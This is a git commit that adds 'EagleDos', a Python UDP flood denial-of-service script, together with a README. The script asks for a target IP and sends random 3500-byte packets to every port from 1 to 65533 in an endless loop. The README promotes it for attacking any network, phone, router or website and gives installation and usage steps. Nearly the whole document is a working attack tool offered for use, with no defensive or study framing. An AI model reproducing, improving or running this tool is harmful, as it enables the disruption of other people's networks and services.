b518e1609358554e24bc3de1831160bdc9d1f9eb
Priyank Rastogi <rastogi2198@gmail.com>
2024-11-21 17:57:38 +0530

    Add files via upload

---
+++ EagleDos.py
@@ -0,0 +1,48 @@
+#Author PRIYANK R'
+import socket
+import os
+import random
+import time
+
+B = '\033[1m'
+R = '\033[31m'
+N = '\033[0m'
+
+white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(3500)
+
+os.system("clear")
+print(" ")
+print("                              $$\                       $ \                     ")
+print("                              $$ |                      $$ |                    ")
+print(" $$$$$$\   $$$$$$\   $$$$$$\  $$ | $$$$$$\         $$$$$$$ | $$$$$$\   $$$$$$$\ ")
+print("$$  __$$\  \____$$\ $$  __$$\ $$ |$$  __$$\       $$  __$$ |$$  __$$\ $$  _____|")
+print("$$$$$$$$ | $$$$$$$ |$$ /  $$ |$$ |$$$$$$$$ |      $$ /  $$ |$$ /  $$ |\$$$$$$\  ")
+print("$$   ____|$$  __$$ |$$ |  $$ |$$ |$$   ____|      $$ |  $$ |$$ |  $$ | \____$$\ ")
+print("\$$$$$$$\ \$$$$$$$ |\$$$$$$$ |$$ |\$$$$$$$\       \$$$$$$$ |\$$$$$$  |$$$$$$$  |")
+print(" \_______| \_______| \____$$ |\__| \_______|       \_______| \______/ \_______/ ")
+print("                    $$\   $$ |                                                  ")
+print("                    \$$$$$$  |                                                  ")
+print("                     \______/                                                   ")
+print()
+print("[" + B + "" + R + "#" + N + "] " + B + "" + R + "Author : Priyank Rastogi" + N + "   Eagle Dos From - " + B + "" + R + "Technical" + N)
+print()
+print("\033[32m================================================================\033[0m")
+print("\033[32mTool devoloped : Priyank_Rastogi\033[0m")
+print("\033[33mGithub 	       : https://github.com/technical404/\033[0m")
+print("\033[33mLinkedin       : https://www.linkedin.com/in/thepriyankrastogi/\033[0m")
+print("\033[32m================================================================\033[0m")
+print()
+
+ip = input("[+] Target's IP : ")
+os.system("clear")
+print("Attack starting...")
+time.sleep(3)
+while True:
+    sent = 0
+    for port in range(1, 65534):
+        white.sendto(bytes, (ip, port))
+        sent = sent + 1
+        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))
+
+print("\033[1;92mAttack finished\033[0m")
---
+++ README.md
@@ -0,0 +1,41 @@
+<div align="center">
+<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Pirata+One&size=50&pause=1000&color=D2042D&center=true&vCenter=true&width=435&lines=EagleDos" alt="Typing SVG" /></a>
+</div>
+
+
+EagleDos tool used for ddos attack from port 1 to port 65534. You can attack to any network or to an android phone, a computer, a router or a website with their ip address on any port.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+
+## Features
+
+- **DOS Attack**: Quickly Start Dos Attack On Multiple Ports.
+- **Easy to Use**: Simple command-line interface that requires minimal setup.
+- **Lightweight**: Built with Python, making it easy to run on any Unix-based system.
+- **Open Source**: Contribute to the project and help improve it!
+
+## Installation
+
+To get started with EagleDos, follow these simple steps:
+
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/technical404/EagleDos.git
+   ```
+2. Navigate to the project directory:
+   ```bash
+   cd EagleDos
+   ```
+
+## Usage
+
+To use EagleDos, run the following command in your terminal:
+
+```bash
+python EagleDos.py
+```
+Thank you for using EagleDos! Keep Learning & Keep Enjoying! 🎉
